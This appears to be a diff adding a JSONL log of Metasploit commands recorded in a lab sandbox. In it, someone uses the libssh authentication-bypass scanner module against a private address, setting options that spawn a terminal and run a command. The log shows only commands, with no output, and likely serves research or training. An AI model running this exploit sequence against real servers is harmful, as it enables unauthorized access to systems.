@@ -1,0 +1,17 @@
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:28:26.185711Z", "cmd_type": "msf-command", "cmd": "use scanner/ssh/libssh_auth_bypass"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:28:36.270184Z", "cmd_type": "msf-command", "cmd": "options"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:28:46.111694Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:29:15.971305Z", "cmd_type": "msf-command", "cmd": "set"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:29:26.855573Z", "cmd_type": "msf-command", "cmd": "set RHOSTS"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:30:00.286836Z", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.5"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:30:03.492493Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:30:30.000361Z", "cmd_type": "msf-command", "cmd": "set"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:30:37.151222Z", "cmd_type": "msf-command", "cmd": "set SPAWN_PTY true"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:30:39.554262Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:31:04.591179Z", "cmd_type": "msf-command", "cmd": "set CMD ls"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:31:07.998021Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:31:24.480711Z", "cmd_type": "msf-command", "cmd": "set VERBOSE true"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:31:48.876496Z", "cmd_type": "msf-command", "cmd": "set RPORT 23"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:31:52.183318Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:32:44.148133Z", "cmd_type": "msf-command", "cmd": "exit"}
+{"sandbox_id": "93", "timestamp_str": "2019-12-08T20:32:48.314193Z", "cmd_type": "msf-command", "cmd": "exit -y"}
